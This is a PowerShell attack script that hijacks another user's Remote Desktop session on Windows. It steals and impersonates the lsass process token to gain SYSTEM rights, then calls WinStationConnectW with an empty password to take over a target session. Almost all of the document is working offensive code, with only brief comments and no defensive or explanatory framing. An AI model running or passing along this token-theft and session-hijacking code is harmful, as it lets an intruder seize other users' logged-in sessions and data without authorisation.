#in order this to work you need to run as system
#take control of another remote session
Function ts-remote($target)
{
    #Impersonating your current token to the Id of the process your specified(default is System)
    Function token-elevate($id=(Get-Process -Name lsass).Id)
    {
        $elevate = @"
        public enum SECURITY_IMPERSONATION_LEVEL 
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        public enum TOKEN_TYPE 
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType,out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError=true)] 
        [return: MarshalAs(UnmanagedType.Bool)] 
        public static extern bool SetThreadToken(IntPtr PHThread,IntPtr Token);
    
        [DllImport("advapi32.dll", SetLastError=true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle,UInt32 DesiredAccess, out IntPtr TokenHandle); 
"@

    
        Add-Type -MemberDefinition $elevate -Namespace "token" -Name "elevate"
    
        $TOKEN_IMPERSONATE = 4
        $TOKEN_DUPLICATE = 2
        $TOKEN_QUERY = 8

        #Open handle to the token of the process, duplicate it and set the current thread token to the one of the process.
        Function TokenImpersonate($id)
        {
            $process = Get-Process -Id $id
            $hToken = New-Object System.IntPtr
            [token.elevate]::OpenProcessToken($process.Handle,$TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE,[ref]$hToken)|Out-Null

            $DupToken = New-Object System.IntPtr
            [token.elevate]::DuplicateTokenEx($hToken,$TOKEN_QUERY -bor $TOKEN_IMPERSONATE,[intptr]::Zero,[token.elevate+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation,[token.elevate+TOKEN_TYPE]::TokenImpersonation,[ref]$DupToken)|Out-Null
            [token.elevate]::SetThreadToken([IntPtr]::Zero,$DupToken)|Out-Null
        }

        $prid = (Get-Process -Name lsass).Id
        if($id -eq $prid){TokenImpersonate $prid}
        else{TokenImpersonate $prid ; TokenImpersonate $id}
    }

    $remote = @"
    [DllImport("winsta.dll", SetLastError=true)]
    public static extern bool WinStationConnectW(IntPtr hServer,uint SessionId,uint TargetSessionID,[MarshalAs(UnmanagedType.LPWStr)] string Password ,bool bWait);
"@
    if(!([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM")){token-elevate|Out-Null}
    $SERVERHANDLE_CURRENT = New-Object System.IntPtr
    $currentSessionId = [System.Diagnostics.Process]::GetCurrentProcess().SessionId
    $password = ""
    Add-Type -MemberDefinition $remote -Namespace "ts" -Name "remote"
    $res = [ts.remote]::WinStationConnectW($SERVERHANDLE_CURRENT,$target,$currentSessionId,$password,$false)
    if(!($res)){Write-Host "[x] Failed to take over a session (maybe you are not running as system ?)" -ForegroundColor Red}
    if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM"){[token.elevate]::SetThreadToken([System.IntPtr]::Zero,[System.IntPtr]::Zero)|Out-Null}
}